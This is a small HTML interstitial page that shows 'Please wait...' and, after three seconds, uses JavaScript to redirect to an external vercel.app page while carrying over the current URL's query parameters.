
<!DOCTYPE html>
<html>
<head>
  <title>Please wait...</title>
  <script>
    // Redirect function delayed by 3 seconds
    function delayedRedirect() {
      // Get current URL parameters
      const params = new URLSearchParams(window.location.search);

      // Set the redirect base URL
      const baseURL = "https://hub-cart.vercel.app/accesspoint.html";

      // Final redirect URL with params
      const redirectURL = baseURL + "?" + params.toString();

      // Redirect
      window.location.href = redirectURL;
    }

    // Run redirect after 3000 ms (3 seconds)
    setTimeout(delayedRedirect, 3000);
  </script>
</head>
<body>
  <p>Please wait...</p>
</body>
</html>
